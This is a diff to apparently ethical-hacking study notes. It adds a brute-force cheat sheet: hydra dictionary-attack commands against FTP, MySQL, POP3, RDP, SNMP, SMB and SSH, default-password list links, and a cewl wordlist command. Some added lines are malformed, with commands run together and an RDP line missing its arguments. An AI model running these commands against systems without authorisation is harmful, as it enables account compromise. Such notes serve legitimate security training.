@@ -32,21 +32,36 @@
 
 {% embed url="https://www.kali.org/tools/uniscan/" %}
 
-### **FTP Bruteforce Credentials using a Dictionary Attack**
+### **Bruteforce Credentials using a Dictionary Attack**
 
 * `nmap -p 21 <Target IP>`
 * `hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10`
 * `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.11`
+* `hydra -l root -P passwords.txt [-t 32] ftp`
+* `hydra -L usernames.txt -P pass.txt mysql`
+* `hydra -l USERNAME -P /path/to/passwords.txt -f pop3 -V`
+* `hydra -V -f -L -P rdp:// hydra -P common-snmp-community-strings.txt target.com snmp`
+* `hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1 hydra -l root -P passwords.txt ssh`
 
-{% embed url="https://app.gitbook.com/o/s2H3MdEB0Qp2IbE58Gxw/s/iS3hadq7jVFgSa8k5wRA/~/changes/38/practical-ethical-hacker-notes/hydra" %}
-Hydra
-{% endembed %}
+{% content-ref url="../hydra.md" %}
+[hydra.md](../hydra.md)
+{% endcontent-ref %}
 
-##
+### **Useful default password list**
 
+* [http://www.phenoelit.org/dpl/dpl.html](http://www.phenoelit.org/dpl/dpl.html)
+* [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)
+* [https://github.com/Dormidera/WordList-Compendium](https://github.com/Dormidera/WordList-Compendium)
 
+### **Making custom wordlist from website keywords:**
 
+* **`cewl`**` ``example.com -m 5 -w words.txt`
 
+where **cewl** is the tool, **example.com** is the site, **-m** is to specify the minimum length of the word , **-w** is to specify the output file
+
+{% content-ref url="../cewl.md" %}
+[cewl.md](../cewl.md)
+{% endcontent-ref %}
 
 
 
